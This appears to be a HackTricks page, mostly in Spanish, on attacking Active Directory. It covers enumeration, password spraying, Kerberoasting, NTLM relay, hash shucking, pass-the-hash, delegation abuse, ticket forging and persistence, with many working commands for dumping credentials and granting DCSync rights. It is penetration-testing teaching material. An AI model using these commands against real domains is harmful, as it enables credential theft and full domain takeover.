# Metodología de Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Visión general básica

**Active Directory** sirve como una tecnología fundamental que permite a los **administradores de red** crear y gestionar de forma eficiente **dominios**, **usuarios** y **objetos** dentro de una red. Está diseñado para escalar, facilitando la organización de un gran número de usuarios en **grupos** y **subgrupos** manejables, mientras controla los **derechos de acceso** en varios niveles.

La estructura de **Active Directory** se compone de tres capas principales: **dominios**, **árboles** y **bosques**. Un **dominio** abarca una colección de objetos, como **usuarios** o **dispositivos**, que comparten una base de datos común. Los **árboles** son grupos de estos dominios enlazados por una estructura compartida, y un **bosque** representa la colección de varios árboles, interconectados mediante **relaciones de confianza**, formando la capa superior de la estructura organizativa. Se pueden designar derechos específicos de **acceso** y **comunicación** en cada uno de estos niveles.

Conceptos clave dentro de **Active Directory** incluyen:

1. **Directorio** – Aglutina toda la información relativa a los objetos de Active Directory.
2. **Objeto** – Denota entidades dentro del directorio, incluyendo **usuarios**, **grupos** o **carpetas compartidas**.
3. **Dominio** – Sirve como contenedor para los objetos del directorio; puede haber múltiples dominios dentro de un **bosque**, cada uno manteniendo su propia colección de objetos.
4. **Árbol** – Agrupación de dominios que comparten un dominio raíz común.
5. **Bosque** – La cúspide de la estructura organizativa en Active Directory, compuesto por varios árboles con **relaciones de confianza** entre ellos.

**Active Directory Domain Services (AD DS)** abarca una serie de servicios críticos para la gestión centralizada y la comunicación dentro de una red. Estos servicios comprenden:

1. **Domain Services** – Centraliza el almacenamiento de datos y gestiona las interacciones entre **usuarios** y **dominios**, incluyendo **autenticación** y funcionalidades de **búsqueda**.
2. **Certificate Services** – Supervisa la creación, distribución y gestión de **certificados digitales** seguros.
3. **Lightweight Directory Services** – Soporta aplicaciones habilitadas para directorio mediante el **protocolo LDAP**.
4. **Directory Federation Services** – Proporciona capacidades de **single-sign-on** para autenticar usuarios a través de múltiples aplicaciones web en una sola sesión.
5. **Rights Management** – Ayuda a proteger material con derechos de autor regulando su distribución y uso no autorizados.
6. **DNS Service** – Crucial para la resolución de **nombres de dominio**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Hoja de referencia

You can take a lot to [https://wadcoms.github.io/](https://wadcoms.github.io) to have a quick view of which commands you can run to enumerate/exploit an AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Si solo tienes acceso a un entorno AD pero no cuentas con credenciales/sesiones, podrías:

- **Pentest the network:**
- Escanear la red, encontrar máquinas y puertos abiertos e intentar **explotar vulnerabilidades** o **extraer credenciales** de ellas (por ejemplo, [printers could be very interesting targets](ad-information-in-printers.md)).
- Enumerar DNS podría proporcionar información sobre servidores clave en el dominio como web, impresoras, shares, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Echa un vistazo a la guía general de [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) para encontrar más información sobre cómo hacer esto.
- **Check for null and Guest access on smb services** (esto no funcionará en versiones modernas de Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Una guía más detallada sobre cómo enumerar un servidor SMB puede encontrarse aquí:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerar LDAP**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Una guía más detallada sobre cómo enumerar LDAP puede encontrarse aquí (presta **especial atención al acceso anónimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Recolectar credenciales **suplantando servicios con Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Acceder a hosts abusando de [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Recolectar credenciales **exponiendo** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extraer nombres de usuario/nombres completos de documentos internos, redes sociales, servicios (principalmente web) dentro del entorno del dominio y también de los disponibles públicamente.
- Si encuentras los nombres completos de los trabajadores de la empresa, podrías probar diferentes convenciones de nombres de usuario de AD (**read this**). Las convenciones más comunes son: _NameSurname_, _Name.Surname_, _NamSur_ (3 letras de cada), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Herramientas:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Consulta las páginas de [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) y [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Cuando se solicita un **nombre de usuario inválido** el servidor responderá usando el **código de error Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, lo que nos permite determinar que el nombre de usuario no existe. Los **nombres de usuario válidos** provocarán ya sea un **TGT en una respuesta AS-REP** o el error _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando que al usuario se le requiere realizar pre-autenticación.
- **No Authentication against MS-NRPC**: Usando auth-level = 1 (No authentication) contra la interfaz MS-NRPC (Netlogon) en domain controllers. El método llama a la función `DsrGetDcNameEx2` después de enlazar la interfaz MS-NRPC para comprobar si el usuario o equipo existe sin credenciales. La herramienta [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa este tipo de enumeración. La investigación puede encontrarse [aquí](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **Servidor OWA (Outlook Web Access)**

Si encuentras uno de estos servidores en la red, también puedes realizar **user enumeration contra él**. Por ejemplo, puedes usar la herramienta [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Puedes encontrar listas de usernames en [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) y en este ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Sin embargo, deberías tener el **nombre de las personas que trabajan en la empresa** desde la fase de recon que deberías haber realizado antes. Con nombre y apellido podrías usar el script [**namemash.py**](https://gist.github.com/superkojiman/11076951) para generar posibles usernames válidos.

### Knowing one or several usernames

Ok, sabes que ya tienes un username válido pero sin passwords... Entonces prueba:

- [**ASREPRoast**](asreproast.md): Si un usuario **no tiene** el atributo _DONT_REQ_PREAUTH_ puedes **solicitar un mensaje AS_REP** para ese usuario que contendrá datos cifrados por una derivación de la password del usuario.
- [**Password Spraying**](password-spraying.md): Probemos las passwords más **comunes** con cada uno de los usuarios descubiertos; quizá algún usuario esté usando una contraseña débil (¡ten en cuenta la política de contraseñas!).
- Ten en cuenta que también puedes **sprayear OWA servers** para intentar obtener acceso a los servidores de correo de los usuarios.

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Podrías ser capaz de **obtener** algunos challenge **hashes** para crackear al **poisoning** de algunos protocolos de la **red**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Si has logrado enumerar Active Directory tendrás **más emails y una mejor comprensión de la red**. Podrías ser capaz de forzar NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) para obtener acceso al entorno AD.

### Steal NTLM Creds

Si puedes **acceder a otros PCs o shares** con el **null or guest user** podrías **colocar archivos** (como un SCF file) que si son accedidos de alguna forma **dispararán una autenticación NTLM contra ti** para que puedas **robar** el **NTLM challenge** y crackearlo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** trata cada NT hash que ya posees como una contraseña candidata para otros formatos más lentos cuyo material de clave se deriva directamente del NT hash. En lugar de brute-forcear passphrases largas en Kerberos RC4 tickets, NetNTLM challenges o cached credentials, alimentas los NT hashes en los modos NT-candidate de Hashcat y dejas que valide la reutilización de contraseñas sin llegar a conocer el texto plano. Esto es especialmente potente tras una compromisión de dominio donde puedes cosechar miles de NT hashes actuales e históricos.

Usa shucking cuando:

- Tienes un corpus NT de DCSync, SAM/SECURITY dumps o vaults de credenciales y necesitas probar reutilización en otros dominios/forests.
- Capturas material Kerberos basado en RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), respuestas NetNTLM o blobs DCC/DCC2.
- Quieres probar rápidamente la reutilización para passphrases largas e intratables e inmediatamente pivotar vía Pass-the-Hash.

La técnica **no funciona** contra tipos de cifrado cuyas claves no son el NT hash (p. ej., Kerberos etype 17/18 AES). Si un dominio impone sólo AES, debes volver a los modos regulares de contraseña.

#### Building an NT hash corpus

- **DCSync/NTDS** – Usa `secretsdump.py` con history para obtener el mayor conjunto posible de NT hashes (y sus valores anteriores):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Las entradas de history amplían dramáticamente el pool de candidatos porque Microsoft puede almacenar hasta 24 hashes anteriores por cuenta. Para más formas de recolectar secretos NTDS ver:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (o Mimikatz `lsadump::sam /patch`) extrae datos SAM/SECURITY locales y cached domain logons (DCC/DCC2). Desduplicar y añadir esos hashes al mismo listado `nt_candidates.txt`.
- **Track metadata** – Conserva el username/domain que produjo cada hash (incluso si la wordlist contiene sólo hex). Los hashes que coinciden te dicen inmediatamente qué principal está reutilizando una contraseña una vez Hashcat imprima el candidato ganador.
- Prefiere candidatos del mismo forest o de un forest confiable; eso maximiza la probabilidad de solapamiento cuando shuckees.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notas:

- Las entradas NT-candidate **deben permanecer como NT hashes raw de 32-hex**. Desactiva los rule engines (no `-r`, no modos híbridos) porque el mangling corrompe el material clave candidato.
- Estos modos no son inherentemente más rápidos, pero el keyspace NTLM (~30,000 MH/s en un M3 Max) es ~100× más rápido que Kerberos RC4 (~300 MH/s). Probar una lista NT curada es mucho más barato que explorar todo el espacio de contraseñas en el formato lento.
- Siempre ejecuta la **última build de Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) porque los modos 31500/31600/35300/35400 se introdujeron recientemente.
- Actualmente no existe un modo NT para AS-REQ Pre-Auth, y los etypes AES (19600/19700) requieren la contraseña en texto plano porque sus claves se derivan via PBKDF2 desde passwords UTF-16LE, no desde NT hashes raw.

#### Example – Kerberoast RC4 (mode 35300)

1. Captura un RC4 TGS para un SPN objetivo con un usuario de bajo privilegio (ver la página de Kerberoast para detalles):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuckea el ticket con tu lista NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat deriva la clave RC4 desde cada candidato NT y valida el blob `$krb5tgs$23$...`. Una coincidencia confirma que la cuenta de servicio usa uno de tus NT hashes existentes.

3. Pivot inmediatamente vía PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Opcionalmente puedes recuperar el texto plano más tarde con `hashcat -m 1000 <matched_hash> wordlists/` si es necesario.

#### Example – Cached credentials (mode 31600)

1. Dump de cached logons desde una workstation comprometida:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copia la línea DCC2 para el usuario de dominio interesante en `dcc2_highpriv.txt` y shuckéala:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Una coincidencia exitosa devuelve el NT hash ya conocido en tu lista, demostrando que el usuario cacheado está reutilizando una contraseña. Úsalo directamente para PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) o brute-forcealo en modo NT rápido para recuperar la cadena.

El mismo flujo se aplica a NetNTLM challenge-responses (`-m 27000/27100`) y DCC (`-m 31500`). Una vez identificada la coincidencia puedes lanzar relay, SMB/WMI/WinRM PtH, o volver a crackear el NT hash con masks/rules offline.



## Enumerating Active Directory WITH credentials/session

Para esta fase necesitas haber **comprometido las credenciales o una sesión de una cuenta de dominio válida.** Si tienes algunas credenciales válidas o una shell como usuario de dominio, **recuerda que las opciones dadas antes siguen siendo válidas para comprometer a otros usuarios**.

Antes de empezar la enumeración autenticada deberías saber cuál es el **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Haber comprometido una cuenta es un **gran paso para comenzar a comprometer todo el dominio**, porque vas a poder iniciar la **Enumeración de Active Directory:**

Respecto a [**ASREPRoast**](asreproast.md) ahora puedes encontrar todos los usuarios potencialmente vulnerables, y respecto a [**Password Spraying**](password-spraying.md) puedes obtener una **lista de todos los usernames** e intentar la contraseña de la cuenta comprometida, passwords vacías y nuevas contraseñas prometedoras.

- Podrías usar el [**CMD para realizar un recon básico**](../basic-cmd-for-pentesters.md#domain-info)
- También puedes usar [**PowerShell para recon**](../basic-powershell-for-pentesters/index.html) lo cual será más sigiloso
- También puedes [**usar powerview**](../basic-powershell-for-pentesters/powerview.md) para extraer información más detallada
- Otra herramienta fantástica para recon en Active Directory es [**BloodHound**](bloodhound.md). No es **muy sigilosa** (dependiendo de los métodos de colección que uses), pero **si no te importa** eso, deberías probarla totalmente. Encuentra dónde los usuarios pueden RDP, encuentra paths hacia otros grupos, etc.
- **Otras herramientas automatizadas de enumeración AD son:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**Registros DNS del AD**](ad-dns-records.md) ya que pueden contener información interesante.
- Una **herramienta con GUI** que puedes usar para enumerar el directorio es **AdExplorer.exe** de la suite **SysInternal**.
- También puedes buscar en la base LDAP con **ldapsearch** para buscar credenciales en los campos _userPassword_ & _unixUserPassword_, o incluso en _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) para otros métodos.
- Si usas **Linux**, también podrías enumerar el dominio usando [**pywerview**](https://github.com/the-useless-one/pywerview).
- También puedes probar herramientas automatizadas como:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extrayendo todos los usuarios de dominio**

Es muy fácil obtener todos los usernames del dominio desde Windows (`net user /domain` ,`Get-DomainUser` o `wmic useraccount get name,sid`). En Linux, puedes usar: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` o `enum4linux -a -u "user" -p "password" <DC IP>`

> Incluso si esta sección de Enumeration parece pequeña, es la parte más importante de todas. Accede a los enlaces (principalmente los de cmd, powershell, powerview y BloodHound), aprende a enumerar un dominio y practica hasta sentirte cómodo. Durante una evaluación, este será el momento clave para encontrar tu camino hacia DA o para decidir que no se puede hacer nada.

### Kerberoast

Kerberoasting implica obtener **TGS tickets** usados por servicios ligados a cuentas de usuario y crackear su cifrado —que está basado en las passwords de usuario— **offline**.

Más sobre esto en:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Una vez que hayas obtenido algunas credenciales podrías comprobar si tienes acceso a alguna **máquina**. Para ello, puedes usar **CrackMapExec** para intentar conectar a varios servidores con diferentes protocolos, según tus escaneos de puertos.

### Local Privilege Escalation

Si has comprometido credenciales o una sesión como usuario de dominio regular y tienes **acceso** con ese usuario a **cualquier máquina del dominio**, deberías intentar escalar privilegios localmente y saquear credenciales. Esto es porque sólo con privilegios de administrador local podrás **dumpear hashes de otros usuarios** en memoria (LSASS) y localmente (SAM).

Hay una página completa en este libro sobre [**local privilege escalation en Windows**](../windows-local-privilege-escalation/index.html) y una [**checklist**](../checklist-windows-privilege-escalation.md). Además, no olvides usar [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Es muy **improbable** que encuentres **tickets** en el usuario actual que te den permiso para acceder a recursos inesperados, pero podrías comprobar:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Si has conseguido enumerar el Active Directory tendrás **más correos y una mejor comprensión de la red**. Podrías ser capaz de forzar NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack).

### Looks for Creds in Computer Shares | SMB Shares

Ahora que tienes algunas credenciales básicas debes comprobar si puedes **encontrar** archivos **interesantes compartidos dentro del AD**. Podrías hacerlo manualmente pero es una tarea muy aburrida y repetitiva (y más aún si encuentras cientos de documentos que necesitas revisar).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Si puedes **acceder a otros PCs o shares** podrías **colocar archivos** (como un archivo SCF) que si de alguna manera se acceden **provocarán una autenticación NTLM contra ti** para que puedas **robar** el **NTLM challenge** y crackearlo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Esta vulnerabilidad permitía a cualquier usuario autenticado **comprometer el controlador de dominio**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Para las siguientes técnicas no basta con un usuario de dominio normal; necesitas privilegios/credenciales especiales para llevar a cabo estos ataques.**

### Hash extraction

Con suerte has conseguido **comprometer alguna cuenta de administrador local** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Entonces, es hora de volcar todos los hashes en memoria y localmente.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Una vez que tienes el hash de un usuario**, puedes usarlo para **suplantarlo**.\
Necesitas usar alguna **herramienta** que **realice** la **autenticación NTLM usando** ese **hash**, **o** podrías crear un nuevo **sessionlogon** e **inyectar** ese **hash** dentro de **LSASS**, de modo que cuando se realice cualquier **autenticación NTLM**, se use ese **hash**. La última opción es la que hace mimikatz.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Este ataque tiene como objetivo **usar el hash NTLM del usuario para solicitar tickets Kerberos**, como alternativa al común Pass The Hash over NTLM protocol. Por lo tanto, esto podría ser especialmente **útil en redes donde NTLM protocol está deshabilitado** y solo **Kerberos está permitido** como protocolo de autenticación.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

En el método de ataque **Pass The Ticket (PTT)**, los atacantes **roban el ticket de autenticación de un usuario** en lugar de su contraseña o valores hash. Este ticket robado se utiliza luego para **suplantar al usuario**, obteniendo acceso no autorizado a recursos y servicios dentro de una red.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Si tienes el **hash** o la **contraseña** de un **administrador local**, deberías intentar **iniciar sesión localmente** en otros **PCs** con ella.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Ten en cuenta que esto es bastante **ruidoso** y **LAPS** lo **mitigaría**.

### Abuso de MSSQL y enlaces de confianza

Si un usuario tiene privilegios para **acceder a instancias MSSQL**, podría usarlo para **ejecutar comandos** en el host MSSQL (si se está ejecutando como SA), **robar** el NetNTLM **hash** o incluso realizar un **relay attack**.\
Además, si una instancia MSSQL es trusted (database link) por otra instancia MSSQL distinta. Si el usuario tiene privilegios sobre la base de datos confiable, podrá **usar la relación de confianza para ejecutar consultas también en la otra instancia**. Estas confianzas pueden encadenarse y en algún punto el usuario podría encontrar una base de datos mal configurada donde pueda ejecutar comandos.\
**Los enlaces entre bases de datos funcionan incluso a través de forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuso de plataformas de inventario/despliegue de TI

Las suites de inventario y despliegue de terceros a menudo exponen rutas poderosas hacia credenciales y ejecución de código. Ver:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Si encuentras cualquier objeto Computer con el atributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) y tienes privilegios de dominio en el equipo, podrás volcar TGTs desde la memoria de todos los usuarios que inicien sesión en el equipo.\
Así que, si un **Domain Admin inicia sesión en el equipo**, podrás volcar su TGT e impersonarlo usando [Pass the Ticket](pass-the-ticket.md).\
Gracias a constrained delegation podrías incluso **comprometer automáticamente un Print Server** (con suerte será un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Si a un usuario o equipo se le permite "Constrained Delegation" podrá **impersonar a cualquier usuario para acceder a algunos servicios en un equipo**.\
Entonces, si **comprometes el hash** de este usuario/equipo podrás **impersonar a cualquier usuario** (incluso a domain admins) para acceder a ciertos servicios.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resource-based Constrain Delegation

Tener privilegio de **WRITE** sobre un objeto de Active Directory de un equipo remoto permite obtener ejecución de código con **privilegios elevados**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abuso de permisos/ACLs

El usuario comprometido podría tener algunos **privilegios interesantes sobre ciertos objetos del dominio** que podrían permitirte **moverte lateralmente/elevar privilegios** más adelante.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abuso del servicio Printer Spooler

Descubrir un **servicio Spool escuchando** dentro del dominio puede ser **abusado** para **adquirir nuevas credenciales** y **elevar privilegios**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abuso de sesiones de terceros

Si **otros usuarios** **acceden** a la máquina **comprometida**, es posible **recoger credenciales desde la memoria** e incluso **inyectar beacons en sus procesos** para impersonarlos.\
Usualmente los usuarios acceden al sistema vía RDP, así que aquí tienes cómo realizar un par de ataques sobre sesiones RDP de terceros:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** proporciona un sistema para gestionar la **contraseña del Administrador local** en equipos unidos al dominio, asegurando que esté **aleatorizada**, única y cambiada con frecuencia. Estas contraseñas se almacenan en Active Directory y el acceso está controlado mediante ACLs para usuarios autorizados únicamente. Con permisos suficientes para acceder a estas contraseñas, es posible pivotar a otros equipos.


{{#ref}}
laps.md
{{#endref}}

### Robo de certificados

**Recopilar certificados** de la máquina comprometida podría ser una forma de escalar privilegios dentro del entorno:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abuso de Certificate Templates

Si se configuran **templates vulnerables** es posible abusar de ellas para escalar privilegios:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-explotación con cuenta de alto privilegio

### Volcar credenciales de dominio

Una vez obtienes **Domain Admin** o mejor aún **Enterprise Admin** privilegios, puedes **volcar** la **base de datos del dominio**: _ntds.dit_.

[**Más información sobre el ataque DCSync se puede encontrar aquí**](dcsync.md).

[**Más información sobre cómo robar el NTDS.dit se puede encontrar aquí**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc como persistencia

Algunas de las técnicas discutidas antes pueden usarse para persistencia.\
Por ejemplo podrías:

- Hacer a usuarios vulnerables a [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Hacer a usuarios vulnerables a [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Conceder privilegios de [**DCSync**](#dcsync) a un usuario

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

El ataque **Silver Ticket** crea un **TGS legítimo** para un servicio específico usando el **NTLM hash** (por ejemplo, el **hash de la cuenta de equipo**). Este método se emplea para **acceder a los privilegios del servicio**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Un ataque **Golden Ticket** implica que un atacante obtiene acceso al **NTLM hash de la cuenta krbtgt** en un entorno Active Directory (AD). Esta cuenta es especial porque se usa para firmar todos los **Ticket Granting Tickets (TGTs)**, que son esenciales para la autenticación dentro de la red AD.

Una vez que el atacante obtiene este hash, puede crear **TGTs** para cualquier cuenta que elija (ataque Silver ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Son como golden tickets forjados de una manera que **evita los mecanismos comunes de detección de golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistencia con cuentas mediante certificados**

**Tener certificados de una cuenta o poder solicitarlos** es una muy buena manera de persistir en la cuenta del usuario (incluso si cambia la contraseña):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}

### **Persistencia de dominio con certificados**

**Usar certificados también permite persistir con altos privilegios dentro del dominio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

El objeto **AdminSDHolder** en Active Directory asegura la seguridad de los **grupos privilegiados** (como Domain Admins y Enterprise Admins) aplicando una **ACL** estándar a través de estos grupos para prevenir cambios no autorizados. Sin embargo, esta funcionalidad puede ser explotada; si un atacante modifica la ACL de AdminSDHolder para dar acceso total a un usuario normal, ese usuario obtiene control extenso sobre todos los grupos privilegiados. Esta medida de seguridad, pensada para proteger, puede volverse en contra si no se supervisa de cerca.

[**Más información sobre AdminDSHolder Group aquí.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Credenciales DSRM

Dentro de cada **Domain Controller (DC)** existe una cuenta de **administrador local**. Al obtener derechos de admin en dicha máquina, el hash del Administrador local puede extraerse usando **mimikatz**. Después de esto, es necesaria una modificación del registro para **habilitar el uso de esta contraseña**, lo que permite acceso remoto a la cuenta de Administrador local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Persistencia mediante ACL

Podrías **dar** algunos **permisos especiales** a un **usuario** sobre objetos específicos del dominio que le permitan **escalar privilegios en el futuro**.


{{#ref}}
